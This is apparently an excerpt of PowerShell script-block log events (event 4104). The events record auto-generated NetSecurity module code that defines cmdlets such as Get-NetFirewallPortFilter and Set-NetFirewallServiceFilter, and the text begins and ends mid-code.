    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='GetAll')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Service') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Service})
        $__cmdletization_queryBuilder.FilterByProperty('ServiceName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallRule') -and (@('ByAssociatedNetFirewallRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallRule}, 'MSFT_NetFirewallRuleFilterByService', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByQuery', 'ByAssociatedNetFirewallRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByQuery', 'ByAssociatedNetFirewallRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallServiceFilter.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-NetFirewallServiceFilter' -Alias '*'
        

function Set-NetFirewallServiceFilter
{
    [CmdletBinding(DefaultParameterSetName='Query (cdxml)', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetServiceFilter')]

    param(
    
    [Parameter(ParameterSetName='Query (cdxml)')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetServiceFilter')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${Service},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('Query (cdxml)') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('Query (cdxml)') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('Query (cdxml)', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Service')) {
            [object]$__cmdletization_value = ${Service}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ServiceName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ServiceName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallServiceFilter.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-NetFirewallServiceFilter' -Alias '*'
        


ScriptBlock ID: 741995eb-34fc-4b82-b9a8-16df5a07919a
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (1 of 1):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetProtocolPortFilter'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Get-NetFirewallPortFilter
{
    [CmdletBinding(DefaultParameterSetName='GetAll', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetProtocolPortFilter')]

    param(
    
    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Protocol},

    [Parameter(ParameterSetName='ByQuery')]
    [Alias('DynamicTransport')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.DynamicTransport[]]
    ${DynamicTarget},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallRule},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetConSecRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecRule},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Protocol') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Protocol})
        $__cmdletization_queryBuilder.FilterByProperty('Protocol', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DynamicTarget') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DynamicTarget})
        $__cmdletization_queryBuilder.FilterByProperty('DynamicTransport', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallRule') -and (@('ByAssociatedNetFirewallRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallRule}, 'MSFT_NetFirewallRuleFilterByProtocolPort', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecRule') -and (@('ByAssociatedNetIPsecRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecRule}, 'MSFT_NetConSecRuleFilterByProtocolPort', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByQuery', 'ByAssociatedNetFirewallRule', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByQuery', 'ByAssociatedNetFirewallRule', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallPortFilter.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-NetFirewallPortFilter' -Alias '*'
        

function Set-NetFirewallPortFilter
{
    [CmdletBinding(DefaultParameterSetName='Query (cdxml)', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetProtocolPortFilter')]

    param(
    
    [Parameter(ParameterSetName='Query (cdxml)')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetProtocolPortFilter')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${Protocol},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${LocalPort},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${RemotePort},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${IcmpType},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('DynamicTransport')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.DynamicTransport]
    ${DynamicTarget},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('Query (cdxml)') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('Query (cdxml)') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('Query (cdxml)', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Protocol')) {
            [object]$__cmdletization_value = ${Protocol}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Protocol'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Protocol'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('LocalPort')) {
            [object]$__cmdletization_value = ${LocalPort}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalPort'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalPort'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('RemotePort')) {
            [object]$__cmdletization_value = ${RemotePort}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemotePort'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemotePort'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('IcmpType')) {
            [object]$__cmdletization_value = ${IcmpType}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IcmpType'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IcmpType'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('DynamicTarget')) {
            [object]$__cmdletization_value = ${DynamicTarget}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DynamicTransport'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.DynamicTransport'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DynamicTransport'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.DynamicTransport'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallPortFilter.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-NetFirewallPortFilter' -Alias '*'
        


ScriptBlock ID: 61a03265-5b84-4905-a403-90a8319b322d
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (2 of 2):
tion.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('Query (cdxml)', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Authentication')) {
            [object]$__cmdletization_value = ${Authentication}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Authentication'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Authentication'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Authentication'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Authentication'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Encryption')) {
            [object]$__cmdletization_value = ${Encryption}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Encryption'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Encryption'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Encryption'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Encryption'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('OverrideBlockRules')) {
            [object]$__cmdletization_value = ${OverrideBlockRules}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'OverrideBlockRules'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'OverrideBlockRules'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('LocalUser')) {
            [object]$__cmdletization_value = ${LocalUser}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalUsers'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalUsers'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('RemoteUser')) {
            [object]$__cmdletization_value = ${RemoteUser}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteUsers'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteUsers'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('RemoteMachine')) {
            [object]$__cmdletization_value = ${RemoteMachine}
